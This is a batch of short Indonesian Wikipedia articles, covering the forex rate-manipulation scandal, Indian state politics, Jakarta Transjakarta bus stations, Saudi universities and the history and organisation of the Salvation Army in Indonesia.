Skandal valas (biasa disebut forex probe) adalah skandal keuangan yang melibatkan pengungkapan dan penyelidikan bank-bank yang bersekongkol selama satu dasawarsa untuk memanipulasi nilai tukar demi keuntungannya sendiri. Regulator pasar di Asia, Swiss, Britania Raya, dan Amerika Serikat mulai melakukan investigasi pada pasar valuta asing (valas) yang sirkulasinya mencapai $5,3 triliun per hari setelah "Bloomberg News" melaporkan pada Juni 2013 bahwa para pedagang valas mengaku melakukan "front-running" pada pesanan klien dan memalsukan nilai patok valuta asing WM/Reuters dengan bersekongkol bersama rekan-rekannya dan melakukan perdagangan sebelum dan ketika proses pergantian nilai patok terjadi selama 60 detik. Tindakan ini dilakukan setiap hari di pasar mata uang spot dan terjadi selama hampir satu dasawarsa menurut pengakuan para pedagang valas.

Hal yang menjadi sumber investigasi skandal ini adalah transkrip ruang obrolan elektronik yang digunakan pedagang valas senior bersama para pesaingnya di bank-bank lain untuk membahas jenis dan volume perdagangan yang hendak mereka manfaatkan. Ruang obrolan elektronik ini diberi nama "The Cartel", "The Bandits’ Club", "One Team, One Dream", dan "The Mafia". Diskusi di ruang obrolan ini diselingi lelucon tentang memanipulasi pasar valuta asing serta alkohol, obat-obatan terlarang, dan perempuan. Pihak regulator berfokus pada satu ruang obrolan eksklusif yang diberi nama The Cartel atau The Mafia. Ruang obrolan tersebut digunakan oleh para pedagang paling berpengaruh di London dan keanggotaannya sangat eksklusif. Salah satu anggota The Cartel adalah Richard Usher, mantan pedagang senior Royal Bank of Scotland (RBS) yang menjadi kepala pedagangan valuta asing spot JPMorgan pada tahun 2010; Rohan Ramchandani, kepala perdagangan spot Eropa Citigroup; Matt Gardiner, pedagang yang pindah ke Standard Chartered setelah bekerja di UBS dan Barclays; dan Chris Ashton, kepala perdagangan spot di Barclays. Dua di antaranya, Usher dan Ramchandani, merupakan anggota kelompok pedagang utama Bank of England Joint Standing Committee yang beranggotakan 13 orang.

Sedikitnya 15 bank, termasuk Barclays, HSBC, dan Goldman Sachs, mengungkapkan adanya investigasi oleh pihak regulator. Barclays, Citigroup, dan JPMorgan Chase mendiskors atau mencutikan semua pedagang valas senior. Deutsche Bank, bank pinjaman terbesar di benua Eropa, mematuhi permintaan informasi dari para regulator. Barclays, Citigroup, Deutsche Bank, HSBC, JPMorgan Chase, Lloyds, RBS, Standard Chartered, UBS, dan Bank of England telah mendiskors, mencutikan, atau memecat kurang lebih 40 karyawan valas pada Juni 2014. Citigroup juga sudah memecat kepala divisi perdagangan valuta asing spot Eropa, Rohan Ramchandani; Ramchandani merupakan anggota kelompok pedagang utama Bank of England Joint Standing Committee yang beranggotakan 13 orang. "Reuters" melaporkan bahwa ratusan pedagang di seluruh dunia bisa terkena dampak skandal ini.

Pada tanggal 20 Mei 2015, lima bank mengaku bersalah atas tuduhan kejahatan berat oleh Departemen Kehakiman Amerika Serikat dan menyetujui pembayaran denda bernilai total $5,7 miliar. Empat di antaranya, Barclays, Citigroup, JP Morgan, dan Royal Bank of Scotland, mengaku bersalah atas tuduhan manipulasi pasar asing. Meski bank-bank lain sudah didenda duluan setelah investigasi bulan November 2004, Barclays belum dilibatkan dan dijatuhi denda senilai $2,4 miliar. UBS juga mengaku bersalah atas tuduhan penipuan transfer dan menyetujui pembayaran denda senilai $203 juta. Bank keenam, Bank of America, meski tidak dinyatakan bersalah, dijatuhi denda $204 juta karena melakukan praktik berbahaya di pasar asing.

Pada tanggal 19 Desember 2014, proses penangkapan pertama orang-orang yang terlibat skandal ini dimulai. Penangkapan mantan pedagang RBS terjadi di Billericay, Essex, dan dilakukan oleh City of London Police dan Serious Fraud Office.











</doc>
<doc id="1754743" url="https://id.wikipedia.org/wiki?curid=1754743" title="Daftar Ketua Menteri Nagaland">
Daftar Ketua Menteri Nagaland

Ketua Menteri Nagaland adalah ketua eksekutif dari negara bagian timur laut India Nagaland. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, tetapi otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Nagaland, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1963, sepuluh orang dari tujuh partai menjabat sebagai Ketua Menteri Nagaland. Tiga orang pertama berasal dari Organisasi Nasionalis Naga, termasuk pemegang jabatan inaugural P. Shilu Ao. petahana saat ini adalah T. R. Zeliang dari Front Rakyat Nagaland, yang memegang jabatan sejak 24 Mei 2014.



</doc>
<doc id="1754747" url="https://id.wikipedia.org/wiki?curid=1754747" title="SDN 2 Kesambirampak Situbondo">
SDN 2 Kesambirampak Situbondo

SDN 2 Kesambirampak terletak di kabupaten situbondo jawa timur,tepatnya di jalan kh.moh rais desa kesambirampak kecamataan kapongan berdiri pada tahun 1975 pada masa awal berdiri Sdn 2 kesambirampak berada satu halaman dengan sdn 1 kesambirampak namun pada tahun 2000an kedua sekolah ini di marger akibat jumlah murid mengalami penurunan karena pada waktu itu jumlah murid sdn 2 kesambirampak lebih banyak jadilah sdn 1 kesambirampak yang di merger ke sdn2 kesambirampak http://www.manggale.com/
Pada tahun ajaran 2014/2015 ini jumlah murid sdn2 kesambirampak berjumlah 90 siswa,saat ini sdn 2 kesambirampak di pimpin seorang kepala sekolah bernama bapak supardi.s.pd. dengan jumlah guru Pegawai Negeri Sipil sebanyak 8 orang dan guru tidak tetapnya berjumlah 11 orang dan seorang penjaga sekolah

</doc>
<doc id="1754749" url="https://id.wikipedia.org/wiki?curid=1754749" title="Vidhan Sabha">
Vidhan Sabha

Vidhan Sabha atau Majelis Legislatif, adalah dewan rendah (bikameral) atau dewan tunggah (dalam negara bagian unikameral) dari legislatur negara bagian di negara bagian India yang berbeda. Nama yang sama juga dihunakan untuk dewan rendah dari legislatur untuk dua Teritorial Serikat, Delhi dan Puducherry. Dewan tertinggi di tujuh negara bagian dengan sebuah legislatur bikameral disebut Dewan Legislatif, atau Vidhan Parishad.




</doc>
<doc id="1754760" url="https://id.wikipedia.org/wiki?curid=1754760" title="Kementerian Kesehatan, Kesejahteraan dan Olahraga (Belanda)">
Kementerian Kesehatan, Kesejahteraan dan Olahraga (Belanda)

Kementerian Kesehatan, Kesejahteraan dan Olahraga (; VWS) adalah Kementerian Belanda yang bertanggung jawab untuk Kesehatan, Kesejahteraan dan Olahraga. Kementerian tersebut dibuat pada 1951 dengan nama "Kementerian Urusan Sosial dan Kesehatan" dan beberapa kali berganti nama sebelum kementerian tersebut menjadi "Kementerian Kesehatan, Kesejahteraan dan Olahraga" pada 1994. Kementerian tersebut dikepalai oleh Menteri Kesehatan, Kesejahteraan dan Olahraga, saat ini Edith Schippers.

Kementerian tersebut bertanggung jawab untuk tiga wilayah kebijakan:

Kementerian tersebut didirikan sebagai Kementerian Karya Sosial sejak 1952. Pada 1965, kementerian tersebut juga diberi tanggung jawab untuk Budaya dan Rekreasi dan kementerian tersebut dinamai Kementerian Budaya, Rekreasi dan Karya Sosial. Antara 1951 dan 1973, kementerian tersebut menjadi Kementerian Urusan Sosial dan Peduli Kesehatan. Pada 1973, Kementerian Kesehatan dan Lingkungan Hidup secara terpisah dibentuk. Pada 1982, dua kementerian tersebut digabung menjadi Kementerian Kesehatan, Kesejahteraan dan Olahraga. Tanggung jawab yang meliputi lingkungan hidup dan manajemen alam diberikan kepada Kementerian Perumahan, Perencanaan Tata Ruang dan Lingkungan Hidup dan Agribudaya, Alam dan Perikanan yang baru dibentuk kembali. Kementerian tersebut membangun sebuah markas besar yang baru pada 2003 yang dirancang oleh arsitek Michael Graves.
Pada 1996, tanggung jawab budaya dipindahkan ke Kementerian Pendidikan, Budaya dan Ilmu Pengetahuan yang baru dibentuk kembali.

"Untuk daftar lengkap, lihat ." 



</doc>
<doc id="1754762" url="https://id.wikipedia.org/wiki?curid=1754762" title="Piala Dunia U-20 FIFA 2015 Grup B">
Piala Dunia U-20 FIFA 2015 Grup B

Grup B Piala Dunia U-20 FIFA 2015 terdiri atas , Panama, Ghana, dan . Pertandingan akan berlangsung dari tanggal 30 Mei sampai 5 Juni 2015.
(H) adalah Tuan Rumah
? adalah belum diketahui.


</doc>
<doc id="1754765" url="https://id.wikipedia.org/wiki?curid=1754765" title="Virbhadra Singh">
Virbhadra Singh

Virbhadra Singh (kelahiran 23 Juni 1934) adalah seorang politikus India yang menjadi Ketua Menteri Himachal Pradesh sejak 2012. Ia sebelumnya memegang beberapa jabatan politik nasional dan sebelumnya menjabat sebagai Ketua Menteri Himachal Pradesh dari 1983 sampai 1990, dari 1993 sampai 1998, dan dari 2003 sampai 2007. Ia menjadi anggota terpilih Lok Sabha pada 1962, 1967, 1972, 1980 dan in 2009. Ia adalah anggota Kongres Nasional India. Istrinya, Pratibha Singh, adalah seorang anggota Lok Sabha dari Mandi.

Virbhadra Singh lahir pada 23 Juni 1934 di Sarahan, Shimla. Ayahnya adalah Padam Singh.

Singh dididik di Bishop Cotton School, dan kemudian mendapatkan gelar Kehormatan BA dari St. Stephen's College, Delhi.

Ia menikah dengan Pratibha Singh pada 1985. Ia memiliki seorang putra dan empat putri.


</doc>
<doc id="1754982" url="https://id.wikipedia.org/wiki?curid=1754982" title="Bobodolan">
Bobodolan

Bobodolan adalah salah satu pemukiman di Desa Rancaekek Kulon, Kecamatan Rancaekek, Kabupaten Bandung. Bobodolan terdiri dari 3 RW dari total 13 RW di Rancaekek Kulon, dan menyumabangkan luas 80% dari total wilayah Rancaekek Kulon karena diselatan wilayah Bobodolan merupakan ladang persawahan. selama 3 dekade terakhir atau sekitar 5 masa jabatan kepala desa Rancaekek Kulon selalu berasal dari Bobodolan

Bobodolan berasal dari kata Bedol yang diambil dari basa sunda yang berarti Jebol, dikarenakan wilayah ini sering diterjang banjir akibat jebol serta luapan sungai cikeruh yang berada di wilayah utara Bobodolan, nama lain Bobodolan adalah Neglasari merujuk pada nama jalannya.

Bobodolan terdiri dari 3 RW yakni RW 09, 10 & 13, Bobodolan terbagi dalam beberapa pemukiman yakni;


Rencanya Babakan Adar akan dimekarkan mejadi RW baru yakni RW 14.

Mayoritas penduduk Bobodolan adalah orang Sunda yang menganut agama Islam Sunni hanya ada beberapa orang yang menganut agama Kristen ataupun Sunda Wiwitan, selain suku sunda di Bobodolan juga terdapat orang jawa, makassar dan Minang. Bahasa yang digunakan warga Bobodolan adalah bahasa sunda.




Jalanan di Bobodolan bisa dikatakan rusak parah akibat dari banjir yang kerap melanda pada musim hujan.
akses sendiri cukup strategis karena hanya 1 km dari stasiun Rancaekek dan 3 km dari Terminal dan Tol Cileunyi.

</doc>
<doc id="1755047" url="https://id.wikipedia.org/wiki?curid=1755047" title="Universitas Ha'il">
Universitas Ha'il

Universitas Ha'il () adalah salah satu perguruan tinggi negeri dibawah Kementerian Pendidikan Arab Saudi yang terletak di kota Ha'il, Provinsi Ha'il, Arab Saudi. Universitas ini berdiri sesuai dengan Surat Keputusan Kerajaan pada hari Selasa, 30 Jumadal Akhir 1246 H/7 Juni 2005 dan saat ini dipimpin oleh Rektornya Dr. Khalid bin Ibrahim bin Salamah al-Ibrahim, yang menggantikan Dr. Ahmad bin Muhammad as-Saif, Rektor pertama Universitas Ha'il yang diangkat sebagai Wakil Menteri Pendidikan Tinggi.




</doc>
<doc id="1755048" url="https://id.wikipedia.org/wiki?curid=1755048" title="Universitas Jazan">
Universitas Jazan

Universitas Jazan () adalah salah satu perguruan tinggi negeri dibawah Kementerian Pendidikan Arab Saudi yang terletak di kota Jazan, Provinsi Jizan, Arab Saudi. Universitas ini berdiri pada tahun 2006, dan merupakan satu-satunya universitas di Provinsi Jizan, yang saat ini dipimpin oleh rektornya Dr. Muhammad bin 'Ali Rabi'





</doc>
<doc id="1755049" url="https://id.wikipedia.org/wiki?curid=1755049" title="Selamanya (album The Overtunes)">
Selamanya (album The Overtunes)

Selamanya merupakan album musik pertama karya The Overtunes. Dirilis pada tahun 2015. Lagu utamanya ialah "Sayap Pelindungmu", "Dunia Bersamamu", & "Jatuh Dari Surga". Dalam memasarkan album ini, The Overtunes bekerjasama dengan KFC, Music Factory dan Album ini hanya dijual di seluruh gerai KFC di Indonesia. Dan ada sebuah lagu yang menjadi soundtrack film Ngenest yaitu "Mungkin", dan "Ku Ingin Kau Tahu".



</doc>
<doc id="1755054" url="https://id.wikipedia.org/wiki?curid=1755054" title="Pal Putih (Transjakarta)">
Pal Putih (Transjakarta)

Pal Putih adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Kramat Raya, Kramat, Senen, Jakarta Pusat. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan.




</doc>
<doc id="1755055" url="https://id.wikipedia.org/wiki?curid=1755055" title="Kramat Sentiong NU (Transjakarta)">
Kramat Sentiong NU (Transjakarta)

Kramat Sentiong NU adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Kramat Raya, Kramat, Senen, Jakarta Pusat. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari Kantor PB Nahdlatul Ulama yang terletak tak jauh dari stasiun BRT dan nama jalan yang berada di dekatnya, yaitu Jalan Kramat Sentiong.




</doc>
<doc id="1755056" url="https://id.wikipedia.org/wiki?curid=1755056" title="Partai Aam Aadmi">
Partai Aam Aadmi

Partai Aam Aadmi (terjemahan: "Partai Pria Umum"; disingkat PAA) adalah sebuah partai politik India, yang secara resmi diluncurkan pada 26 November 2012 dan sekarang menjadi partai pemerintahan Delhi. Partai tersebut dibentuk setelah terjadi perbedaan pendapat antara para aktivis Arvind Kejriwal dan Anna Hazare mengenai biasakah atau tidak untuk mempolitisasi gerakan India Melawan Korupsi yang populer pada Jajak Pendapat Jan Lokpal sejak 2011.

Pada pemilihan Mahkamah Legislatif Delhi 2015, AAP memenangkan 67 dari 70 kursi yang tersedia. Lawannya, Partai Bhartiya Janta, mendapatkan tiga kursi, sementara Kongres Nasional India tidak mendapatkan kursi.

Di India di mana 75 persen sumber keuangan partai-partai politik masih tidak diketahui, PAA adalah satu-satunya partai yang secara sukarela mempublikasikan sumbangan-sumbangannya di situs webnya.


</doc>
<doc id="1755061" url="https://id.wikipedia.org/wiki?curid=1755061" title="Salemba UI (Transjakarta)">
Salemba UI (Transjakarta)

Salemba UI adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Salemba Raya, Paseban, Senen, Jakarta Pusat. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari kampus Fakultas Kedokteran Universitas Indonesia yang terletak di sebelah barat stasiun BRT.

Pada tanggal 3 Juli 2015, bus Transjakarta merek Komodo dengan nomor LRN-045 terbakar di stasiun BRT Salemba UI sehingga menghanguskan bus tersebut dan sebagian stasiun BRT. Bus tersebut terbakar saat hendak menurunkan penumpang. Kebakaran ini diduga akibat korsleting kabel AC di bagian atas bus. Akibat dari kebakaran ini stasiun BRT Salemba UI ditutup sementara. Pada tanggal 7 Juli 2015, Direktur Utama PT. Transportasi Jakarta Antonius NS Kosasih menyatakan bahwa penyebab terbakarnya bus tersebut adalah kerusakan alternator yang menimbulkan percikan api.

Mulai tanggal 6 Juli 2015, stasiun BRT ini diperbaiki dan dibuka kembali pada sore harinya.




</doc>
<doc id="1755065" url="https://id.wikipedia.org/wiki?curid=1755065" title="SMK Dewantara">
SMK Dewantara

Sekolah Menengah Kejuruan Dewantara berdiri pada tahun 2001, berada dibawah naungan Yayasan Pengembangan Pendidika Dinamika (YPPD) Cikarang. Pada awal berdiri SMK Dewantara terletak di kampus I (Gedung AMIK Cikarang, yang sekarang berubah nama menjadi “STMIK CIKARANG“). Jumlah Siswa pada awal berdiri sebanyak 35 Siswa dengan Program Keahlian yang dibuka yaitu akuntansi.

Terdapat 4 jurusan yang telah ada yaitu:



</doc>
<doc id="1755066" url="https://id.wikipedia.org/wiki?curid=1755066" title="Salemba Carolus (Transjakarta)">
Salemba Carolus (Transjakarta)

Salemba Carolus adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Salemba Raya, Paseban, Senen, Jakarta Pusat. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari RS St. Carolus yang terletak di sebelah timur stasiun BRT. Yang unik dari stasiun BRT ini sehingga membedakan stasiun BRT lainnya adalah stasiun BRT ini menyediakan travelator untuk memudahkan akses menuju RS St. Carolus.




</doc>
<doc id="1755067" url="https://id.wikipedia.org/wiki?curid=1755067" title="Daftar ketua menteri dari Partai Komunis India (Marxis)">
Daftar ketua menteri dari Partai Komunis India (Marxis)

Pada Agustus 2013, delapan pemimpin Partai Komunis India (Marxis) telah memegang jabatan ketua menteri. Seorang ketua menteri adalah kepala pemerintah dari setiap dua puluh sembilan negara bagian dan dua teritorial serikat (Delhi dan Puducherry). Menurut konstitusi India, di tingkat negara bagian, gubernur adalah kepala "de jure", namun otoritas eksekutif "de facto" dikepalai oleh ketua menteri. Setelah pemilihan-pemilihan dari mahkamah legislatif negara bagian, gubernur biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, dimana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.





</doc>
<doc id="1755069" url="https://id.wikipedia.org/wiki?curid=1755069" title="Matraman 1 (Transjakarta)">
Matraman 1 (Transjakarta)

Matraman 1 adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Matraman Raya, Pal Meriam, Matraman, Jakarta Timur. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari kecamatan di mana stasiun BRT ini berada, Matraman. Stasiun BRT ini menyediakan transfer ke Koridor 4 melalui stasiun BRT Matraman 2.

Stasiun BRT ini ditutup sementara untuk keperluan pembangunan "underpass" di Matraman.



</doc>
<doc id="1755071" url="https://id.wikipedia.org/wiki?curid=1755071" title="Matraman 2 (Transjakarta)">
Matraman 2 (Transjakarta)

Matraman 2 adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pramuka, Pal Meriam, Matraman, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari timur ke barat. Nama stasiun BRT ini berasal dari kecamatan di mana stasiun BRT ini berada, Matraman. Stasiun BRT ini menyediakan transfer ke Koridor 4 melalui stasiun BRT Matraman 1



</doc>
<doc id="1755072" url="https://id.wikipedia.org/wiki?curid=1755072" title="Kongres N.R. Seluruh India">
Kongres N.R. Seluruh India

Kongres N.R. Seluruh India (KNRSI) adalah sebuah partai politik regional yang dibuat oleh Ketua Menteri Puducherry saat ini, N. Rangaswamy di teritoril serikat India Puducherry bersama dengan garis-garis partai politik Dravida regional. Ia mengumumkan pembentukn partai tersebut pada 7 Februari 2011 di kantpr kepala partai tersebut di Pondicherry s3bagai sebuah pecahan dari Kongres Nasional India. Sekarang, partai tersebut menjadi bagian dari Aliansi Demokratik Nasional yang dipimpin oleh Partai Bharatiya Janata yang memerintah.

Situz web resminya menyatakan bahwa kepanjangan dari "N.R." pada nama partai tersebut adalah "Namathu Rajiyam" (artinya "kerajaan kami"). Tulisan tersebut juga merupakan inisial dari pendiri partai tersebut N. Rangasamy.

Motto resmi partai tersebut adalah "Kesederhanaan, Keadilan dan Transparansi".

Ketua Menteri N. Rangasamy mengumumkan bahwa R. Radhakrishnan, mantan Jururbicara Mahkamah Puducherry, akan menjadi kandidat KNRSI untuk konstituensi Puducherry. Kandidat tersebut memenangkan kursi Lok Sabha tunggal.

Pada 21 April 2015, MLA M. V. Ramachandra keluar dari KRNSI, bersama dengan 20 pengacara, meninggalkan partai tersebut dengan 14 anggota.


</doc>
<doc id="1755076" url="https://id.wikipedia.org/wiki?curid=1755076" title="Bala Keselamatan Indonesia">
Bala Keselamatan Indonesia

Bala Keselamatan Indonesia (atau Bala-Tentara Keselamatan) adalah salah satu teritori dari organisasi Salvation Army yang berpusat di London. Kini pelayanan mereka mencakup kurang lebih 15 provinsi di seluruh Indonesia. Pimpinan Bala Keselamatan di Indonesia disebut "Komandan Teritorial" yang memiliki kantor pusat teritorial di Bandung. Berdasarkan situs resmi Bala Keselamatan Indonesia, saat ini mereka memiliki lebih dari 50.000 anggota (bahasa Inggris: "Salvationist")

Sejumlah program yang dilakukan oleh Bala Keselamatan di Indonesia adalah RSU "William Booth" di Surabaya, RSU "William Booth" di Semarang, RS Ibu dan Anak "Catherine Booth" di Makassar, sejumlah sekolah di Jakarta, Bandung, Jombang, Kulawi (Sulawesi Tengah), Semarang, Kec. Long Iram, Kalimantan Timur, dll.

Organisasi ini memiliki sebuah majalah, "Berita Keselamatan", yang menjadi salah satu majalah tertua di Indonesia. Selain itu mereka juga menerbitkan buku renungan berjudul "Oasis Fajar".

Pelayanan Bala Keselamatan di Indonesia yang saat itu bernama Hindia Belanda mulai ditetapkan oleh pada tanggal 11 Agustus 1894 oleh Komandan Teritorial Belanda saat itu yaitu Kolonel Elwin Oliphant. Staf Kapten Jacob Gerrit Brouwer dan Ensign Adolf Theodorus van Emmerik merintis pekerjaan Bala Keselamatan di Hindia Belanda. Tanggal 11 Oktober 1894, kedua orang perintis tersebut 'diselamatjalankan' dalam sebuah kebaktian yang dipimpin oleh Kolonel Oliphant di Amsterdam. Tanggal 24 November 1894 mereka menjejakkan kaki di Pelabuhan Batavia yang dulu bernama Tandjoeng Priok setelah menggunakan kapal bernama "Soerabaja" yang berangkat dari Marseille, Prancis.

Senin, 3 Desember 1894, para perintis bertemu dengan Gubernur Jendral Van Der Wijck di Istana Bogor, yang memberikan jaminan kebebasan bagi kedua perintis untuk melakukan misi Bala Keselamatan. Inilah langkah awal bagi mereka untuk memulai pelayanan Bala Keselamatan. Walaupun banyak orang Kristen di Batavia menghendaki kedua hamba Tuhan ini tetap bersama mereka, kedua perintis tetap berpegang pada misi awalnya yaitu memberitakan Injil kepada penduduk asli, maka mereka pun dengan berat hati dilepas dari Batavia menuju Jawa Tengah. Setelah berganti kereta di Kutoarjo dengan kereta yang lain mereka menuju Purworejo. Setelah beberapa lama di Purworejo belajar bahasa, tulisan (aksara Jawa) dan kebiasaan setempat, atas petunjuk pemerintah mereka diminta untuk memulai pelayanan di sebuah desa yang memiliki banyak orang Kristen yang tidak mempunyai gembala, desa tersebut bernama desa Sapuran, sebuah desa berjarak 17 km dari Wonosobo. Pada tanggal 28 Januari 1895 mereka tiba di Sapuran dan memulai pekerjaan mereka. Mereka juga sempat berkenalan dengan Kyai Sadrach.

Setelah sedikit menguasai bahasa Jawa, mereka mulai membaur dengan penduduk sekitar, berjalan ke mana-mana tanpa alas kaki, berpakaian seperti orang Jawa, dan hidup sangat sederhana, berbeda dengan orang-orang Belanda yang lain. Bahkan Kapten Brouwer memilih nama Jawa Mangunarjo (Mangun Harjo) dan Ensign van Emmerik menggunakan nama Mangun Prawiro dalam kesehariannya.

Pada awal pelayanannya, Bala Keselamatan berpusat di Semarang. Brouwer dan van Emmerik pertama sampai di Semarang tahun 1895 untuk menjemput kedatangan dua opsir baru: Ajudan Alice Cleverly (nantinya menjadi Nyonya van Emmerik) dan Ensign A.B. Claydon. Di Semarang pula diadakan pernikahan pertama dengan upacara Bala Keselamatan antara van Emmerik dan Alice. Setelah itu banyak orang Eropa maupun penduduk setempat yang mengharapkan Bala Keselamatan segera memulai pekerjaannya di Semarang. Pasangan van Emmerik kemudian tinggal di Semarang, sementara Brouwer dan Claydon kembali ke Sapuran.

Pelayanan yang dilakukan di Semarang termasuk pelayanan panti wreda untuk orang-orang lanjut usia, dan pelayanan di penjara, yang menjadi awal dari pelayanan-pelayanan penjara di masa mendatang di Indonesia. Mereka pun mengadakan kebaktian-kebaktian di luar dan di pasar-pasar, serta membagian traktat-traktat dalam bahasa Jawa, Melayu, dan Tionghoa.

Pada awal pelayanannya, Bala Keselamatan dikenal dengan nama bahasa Jawanya: Bala Kěslamětan ().

Tahun 1897 Brouwer mulai membuka sebuah sekolah umum di Semarang hanya dengan seorang tenaga guru.

Bala Keselamatan adalah bagian injili dari Gereja Kristen universal dengan tata organisasi dan pelayanannya sendiri. Doktrin yang diyakininya tidak berbeda dengan keyakinan utamanya dari iman Kristen pada umumnya. Dalam pengakuan iman Bala Keselamatan ditekankan tentang kasih anugerah Allah yang menyelamatkan.

Tempat-tempat ibadah Bala Keselamatan di Indonesia biasanya disebut korps dan pos luar, yang di Indonesia lazim disebut gereja, adalah sebuah tempat ibadah Kristen yang terbuka bagi semua orang, tanpa terkecuali dan diskriminasi, yaitu mereka yang ingin beribadah kepada Tuhan dan memuliakan-Nya. Tempat-tempat ibadah Bala Keselamatan melaksanakan pelayanan ibadah pada setiap hari Minggu dan juga hari-hari lain sesuai jadwal yang telah ditentukan, seperti ibadah doa, pemahaman Alkitab, ibadah kaum pria, ibadah kaum wanita, ibadah kaum lanjut usia, ibadah keluarga dan pertemuan-pertemuan lainnya. Tata ibadah dan suasananya diatur sedemikian rupa, sederhana dan rileks, yang di dalamnya meliputi nyanyian pujian kepada Tuhan, doa, membacaan Alkitab, khotbah, pengakuan iman, kesaksian jemaat dan isian acara lainnya seperti drama atau yang lain-lainnya. Nyanyian-nyanyian pujian dalam ibadah Bala Keselamatan biasanya diiringi oleh brass band, band musik kontemporer dengan piano, keyboard, gitar dan drum, musik tradisional atau tanpa musik. Juga ada kelompok paduan suara atau vocal group yang mengambil bagian dalam ibadah.

Buku nyanyian Bala Keselamatan biasanya menggunakan "Buku Nyanyian Bala Keselamatan" (BNBK) dan juga mengambil dari lagu-lagu kontemporer.

Selain itu sejak Januari 2011, para Prajurit dan anggota Bala Keselamatan di seluruh dunia juga bersatu dalam Doa Jendela 24-7 – berdoa pagi siang malam untuk perdamaian dan keadilan bagi mereka yang menjadi korban ketidakadilan.

Struktur Bala Keselamatan Indonesia adalah sebagai berikut:

Adapun struktur di Pusat Pendidikan dan Pelatihan (Pusdiklat) Bala Keselamatan adalah sebagai berikut:

Untuk tingkat Divisi, pembagian strukturnya adalah sebagai berikut:

Bala Keselamatan Indonesia dibagi menjadi 7 divisi dan 2 regional


Berpusat di Semarang, Divisi Jawa Bali per 2015 memiliki jumlah Korps sebanyak 40, pos luar sebanyak 5, pelayanan sosial 13, serta 5 sekolah. Korps-korps tersebut tersebar di berbagai kota, antara lain Ambarawa, Bandung (Pusat), Banyuwangi, Batujajar, Bekasi, Blora, Cirebon, Denpasar, Jakarta, Jelambar, Taman Kencana, Jember, Jepon, dll.

Berpusat di Manado, Divisi ini per 2015 memiliki jumlah Korps sebanyak 14, pos luar sebanyak 4, klinik 3, serta 2 pelayanan sosial. Korps-korps tersebut tersebar di berbagai tempat, antara lain Manado, Amurang, Boyongpantai, Kumelembuai, Makasili, Remboken, Sonder, Tompaso, Tondano, Tumpaan, [Werot], dll.

Divisi ini merupakan salah satu yang terbesar, yang memiliki jumlah Korps (per 2015) sebanyak 64, pos luar sebanyak 7, pelayanan sosial 30, serta 3 klinik. Karena besarnya pelayanan di divisi ini, maka Divisi Kulawi dibagi lagi menjadi beberapa distrik, antara lain Distrik Kulawi dan Distrik Gimpu.

Korps-korps di divisi Kulawi tersebar di berbagai desa/kecamatan, antara lain Kulawi, Mataue, Houmnu, Kalukuhangkau, Toro, Nentebaru, Peleroa, Salua, Siroa, Winatu, Gimpu, Lawua, Langkapa, Lempelero, Mane, Moa, Palamaki, Parese, dll.

Divisi ini berpusat di Palu, dan merupakan salah satu yang terbesar, yang memiliki jumlah Korps (per 2015) sebanyak 54, pos luar sebanyak 30, pos pelayanan 4, sekolah 16, pelayanan sosial 2, serta 1 klinik. Karena besarnya pelayanan di divisi ini, maka Divisi Palu Barat dibagi lagi menjadi beberapa distrik: Distrik I, Distrik II, dan Distrik III.

Korps-korps di divisi Palu Barat meliputi Palu, Towua, Woodward, Jonooge, Raranggunau, Tompu, Panii, Maranatha, Petimbelagi, Tanapobunti, Lembosu, Lompio, Waturalele, Watubula, Kalawara, Padena, Saluponi, Sibowi, Berdikari, dll.

Divisi ini berpusat di Marawola, dan merupakan salah satu yang terbesar, yang memiliki jumlah Korps (per 2015) sebanyak 49, pos luar sebanyak 23, serta 20 sekolah. Karena besarnya pelayanan di divisi ini, maka Divisi Palu Barat dibagi lagi menjadi beberapa distrik, antara lain Distrik Rowiga dan Distrik Porame.

Korps-korps di divisi Palu Barat tersebar di berbagai desa/kecamatan, antara lain Balamoa, Balumpewa, Jononjindi, Lebanu, Mabere, Mantikole, Poi, Rogo, Waturalele, Wilao, Wisolo, Kawatua, Porame, Bolobia, Doda, Kayumpia, Rawio, Rondingo, dll.

Berpusat di Pasangkayu, Divisi ini per 2015 memiliki jumlah Korps sebanyak 23, pos luar sebanyak 31, serta 6 sekolah. Korps-korps tersebut dibagi menjadi beberapa distrik, antara lain Distrik Malino dan Distrik Mamuju Utara, di berbagai desa/kecamatan, seperti Bambamii, Bailodu, Kasimbar, Malino, Uluwalamate, Mbuwu, Bambawakona, Salumpangoya, Salungia, Ongulara, Sadakanjal, Wulai, Duria Sulapa, Pinoraa, Tosonde, Bamba Apu, dll.

